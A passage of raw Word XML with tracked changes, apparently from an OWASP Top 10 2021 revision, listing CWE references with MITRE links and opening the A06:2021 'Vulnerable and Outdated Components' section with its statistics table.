            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Information](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/537.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="046AA7AD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2191" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2192" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-541: Inclusion of Sensitive Information in an Include </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>File](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/541.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0AAF3C0B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2193" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2194" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-547: Use of Hard-coded, Security-relevant </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Constants](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/547.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7F9F1B34" w14:textId="222FF430" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2195" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [CWE-611: Improper Restriction of </w:t>
      </w:r>
      <w:del w:id="2196" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="005C43E9" w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>XXE</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2197" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">XML External Entity </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Reference</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://cwe.mitre.org/data/definitions/611.html)</w:t>
      </w:r>
      <w:ins w:id="2198" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="24B79DAC" w14:textId="77777777" w:rsidR="005C43E9" w:rsidRPr="005C43E9" w:rsidRDefault="005C43E9" w:rsidP="0024421C">
      <w:pPr>
        <w:pStyle w:val="HTMLVorformatiert"/>
        <w:rPr>
          <w:del w:id="2199" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2200" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [Billion Laughs Attack](https://en.wikipedia.org/wiki/Billion_laughs_attack)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="332886DC" w14:textId="77777777" w:rsidR="005C43E9" w:rsidRPr="005C43E9" w:rsidRDefault="005C43E9" w:rsidP="0024421C">
      <w:pPr>
        <w:pStyle w:val="HTMLVorformatiert"/>
        <w:rPr>
          <w:del w:id="2201" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2202" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [SAML Security XML External Entity Attack](https://secretsofappsecurity.blogspot.tw/2017/01/saml-security-xml-external-entity-attack.html)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="34CA6251" w14:textId="77777777" w:rsidR="005C43E9" w:rsidRPr="003E073E" w:rsidRDefault="005C43E9" w:rsidP="0024421C">
      <w:pPr>
        <w:pStyle w:val="HTMLVorformatiert"/>
        <w:rPr>
          <w:del w:id="2203" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2204" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [Detecting and exploiting XXE in SAML Interfaces](https://web-in-security.blogspot.tw/2014/11/detecting-and-exploiting-xxe-in-saml.html)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="532A8056" w14:textId="77777777" w:rsidR="00A5669C" w:rsidRPr="003E073E" w:rsidRDefault="00A5669C" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2205" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15E39659" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2206" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2207" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Attribute](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/614.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="570BA2EE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2208" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2209" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-756: Missing Custom Error </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Page](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/756.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7476730D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2210" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2211" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-776: Improper Restriction of Recursive Entity References in DTDs ('XML Entity Expansion'</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https://cwe.mitre.org/data/definitions/776.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7F28BDD1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2212" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2213" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-942: Permissive Cross-domain Policy with Untrusted </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Domains](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/942.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5907041E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2214" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2215" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- </w:t>
        </w:r>
        <w:r w:rsidR="0050725B">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>CWE-1004: Sensitive Cookie Without '</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>HttpOnly</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">' </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Flag](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/1004.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7D35E336" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2216" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2217" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-1032: OWASP Top Ten 2017 Category A6 - Security </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Misconfiguration](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/1032.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="175A9989" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2218" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2219" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-1174: ASP.NET Misconfiguration: Improper Model </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Validation](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/1174.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="09C0ED9F" w14:textId="77777777" w:rsidR="00E300D6" w:rsidRDefault="00E300D6" w:rsidP="00AC649A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="49689FDD"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4DC9B67A"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"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E6A5451" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>title:   "A06:2021 – Vulnerable and Outdated Components"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="603173C7" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>id:      "A06:2021"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="643376A7"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255BCAF2"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4D857D6E"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#A06:2021 – Vulnerable and Outdated Components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[icon](assets/TOP_10_Icons_Final_Vulnerable_Outdated_Components.png){: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name="Vulnerable and Outdated Components", lang=lang, source=source, parent=parent, predecessor=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>extra.osib.document</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ~ ".2017.9") }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1529C4CC" w14:textId="280371E2" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2220" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2221" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText># A9:2017 Using</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7E6F85CC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2222" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="176CCC16" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2223" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2224" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Factors</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="43DE2DE6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2225" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D93BC74" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2226" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2227" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>| CWEs Mapped | Max Incidence Rate | Avg Incidence Rate | Max Coverage | Avg Coverage | Avg Weighted Exploit | Avg Weighted Impact | Total Occurrences | Total CVEs |</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="67B17732" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2228" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2229" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>|:-------------:|:--------------------:|:--------------------:|:--------------:|:--------------:|:----------------------:|:---------------------:|:-------------------:|:------------:|</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1E3696D4" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2230" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2231" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>| 3           | 27.96%             | 8.77%              | 51.78%       | 22.47%       | 5.00                 | 5.00                | 30,457            | 0          |</w:t>
        </w:r>
